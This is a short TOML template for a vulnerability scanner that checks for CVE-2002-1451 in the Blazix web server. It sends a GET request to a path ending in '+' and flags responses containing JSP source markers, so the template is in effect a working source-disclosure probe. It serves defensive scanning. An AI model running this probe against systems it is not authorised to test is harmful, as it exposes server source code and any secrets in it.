[info]
author = "ave"
description = "检测 Blazix 特殊字符处理信息泄漏漏洞，通过构造以加号或反斜杠结尾的 HTTP 请求尝试读取 JSP 源代码或列出受限目录"
id = "POC-AVE-2002-0592"
name = "CVE-2002-1451 PoC"
severity = "medium"
tags = ["ave-2002-0592"]
vuln_id = [
    "CVE-2002-1451",
    "AVE-2002-0592",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/+"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<%@",
]
